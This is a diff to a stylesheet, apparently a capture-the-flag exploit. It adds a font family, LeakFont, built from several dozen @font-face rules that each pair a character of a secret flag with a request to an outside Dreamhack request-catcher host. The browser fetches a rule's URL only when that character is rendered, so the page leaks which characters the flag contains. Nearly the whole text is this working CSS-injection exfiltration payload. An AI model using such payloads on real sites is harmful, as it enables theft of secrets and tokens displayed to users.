@@ -2,14 +2,45 @@
 
 body::after {
     content: var(--flag);
+    font-family: LeakFont, sans-serif;
 }
 
-body::after {
-    font-family: 'checkCy';
-}
+/* 숫자 0-9 */
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=0"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0030; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=1"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0031; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=2"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0032; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=3"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0033; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=4"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0034; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=5"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0035; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=6"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0036; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=7"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0037; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=8"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0038; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=9"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0039; }
 
-@font-face {
-    font-family: 'checkCy';
-    src: url('https://poxwbzl.request.dreamhack.games/?flag_start=CyKor');
-    unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B; /* C, y */
-}
+/* 소문자 a-z */
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=a"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0061; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=b"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0062; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=c"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0063; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=d"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0064; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=e"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0065; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=f"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0066; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=g"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0067; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=h"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0068; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=i"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0069; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=j"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+006A; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=k"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+006B; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=l"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+006C; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=m"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+006D; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=n"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+006E; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=o"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+006F; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=p"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0070; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=q"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0071; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=r"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0072; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=s"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0073; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=t"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0074; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=u"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0075; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=v"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0076; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=w"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0077; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=x"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0078; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=y"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+0079; }
+@font-face { font-family: LeakFont; src: url("https://lcrjwfs.request.dreamhack.games/leak?char=z"); unicode-range: U+0043, U+0079, U+006F, U+004B, U+0072, U+007B, U+007A; }
